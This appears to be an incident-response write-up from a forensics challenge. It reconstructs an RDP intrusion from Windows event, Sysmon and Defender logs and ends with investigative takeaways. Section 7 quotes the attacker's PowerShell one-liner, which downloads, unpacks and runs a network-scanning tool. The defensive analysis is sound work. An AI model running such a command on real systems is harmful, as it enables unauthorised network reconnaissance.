# Investigation Notes

## Investigation strategy

The challenge intentionally contained incomplete logging. The most useful lesson was to pivot from **behavior** rather than repeatedly searching for an event that did not exist.

---

## 1. Baseline scheduled tasks before judging the anomaly

Several legitimate tasks were created administratively before the attack, including:

- MorningReport
- DesktopBackup
- TempFilesCleanup
- DriveMapping
- AntivirusUpdate
- FailedLoginReport
- WeeklyDiskCleanup
- SQLConnectivityCheck

This baseline was important because the malicious persistence artifact was visually similar:

~~~text
Legitimate:  SQLConnectivityCheck
Suspicious:  SQLConnectvityCheck
~~~

Without the baseline, the typo would be easy to overlook.

---

## 2. Pivot from malicious process to session

The investigation first established that \`netscan.exe\` was malicious activity.

Security 4688 and Sysmon Event 1 tied it to:

~~~text
User: ALLIANCE\john.shepard
LogonId: 0x7B9417
TerminalSessionId: 2
~~~

From there, all activity associated with that Logon ID could be traced backward.

This was more reliable than searching globally for the earliest \`john.shepard\` activity because the account also had legitimate historical activity.

---

## 3. Missing 4624 did not stop the investigation

Security Event 4624 for the relevant session was absent.

Other authentication pivots were also unhelpful:

- Security 4778/4779 returned no useful session records.
- Domain-controller authentication searches around the timestamp did not reveal the source.
- The source IP was not represented as a separate enrolled endpoint.

The investigation therefore shifted to Sysmon.

---

## 4. Sysmon network telemetry identified the RDP source

Sysmon Event 3 recorded:

~~~text
UtcTime: 2026-06-09 12:39:16.190
Protocol: tcp
Initiated: false
SourceIp: 192.168.72.131
DestinationIp: 192.168.72.101
DestinationPort: 3389
~~~

\`Initiated: false\` is important: the connection was inbound to \`ALLIANCE-WS07\`.

This established the source IP before the login session was fully initialized.

---

## 5. Session artifacts confirmed RDP

The newly created interactive session produced:

- Terminal Session ID \`2\`
- \`rdpclip.exe\`
- user initialization under \`john.shepard\`
- Logon ID \`0x7B9417\`

These artifacts were enough to establish that the activity belonged to an RDP session.

---

## 6. Registry telemetry revealed the remote hostname

The decisive pivot was Sysmon Event 13 against:

~~~text
HKU\<SID>\Volatile Environment\2
~~~

Two values appeared at \`2026-06-09 12:41:09.833\`:

~~~text
SESSIONNAME = RDP-Tcp#0
CLIENTNAME  = kali
~~~

This is a particularly useful fallback when conventional RDP authentication events are unavailable.

---

## 7. PowerShell Script Block Logging reconstructed reconnaissance

PowerShell 4104 preserved the attacker's full command rather than only the \`powershell.exe\` process:

~~~powershell
$url = "https://www.softperfect.com/download/files/netscan_portable.zip"; $out = "C:\Users\Public\netscan_portable.zip"; Invoke-WebRequest -Uri $url -OutFile $out; Expand-Archive $out -DestinationPath "C:\Users\Public\SoftPerfect"; & "C:\Users\Public\SoftPerfect\x86_64\netscan.exe"
~~~

This directly identified:

- the download URL,
- the archive destination,
- the extraction path,
- the reconnaissance tool,
- and the final executable.

---

## 8. Defender and Application logs extended the timeline

On \`ALLIANCE-CENTRAL\`, Defender Event 5007 recorded:

~~~text
HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes\SQLBackup.exe
~~~

Later Security 4688 and Application logs showed:

~~~text
C:\Users\Public\Pictures\SQLBackup.exe
~~~

executing, spawning another copy, and crashing.

This demonstrates the value of continuing to correlate endpoint telemetry even after the initial-access and reconnaissance questions have already been answered.

---

## Practical takeaways

- Build a normal baseline before labeling a scheduled task malicious.
- Track a known-malicious process back to its Logon ID.
- Use Terminal Session ID to group interactive-session behavior.
- Treat inbound Sysmon Event 3 on TCP/3389 as a strong RDP pivot.
- \`rdpclip.exe\` is useful corroborating evidence for RDP.
- \`HKU\...\Volatile Environment\...\CLIENTNAME\` can reveal the RDP client hostname.
- PowerShell 4104 can recover complete attacker commands when process creation logs only show \`powershell.exe\`.
- Missing 4624 does not mean the session cannot be reconstructed.
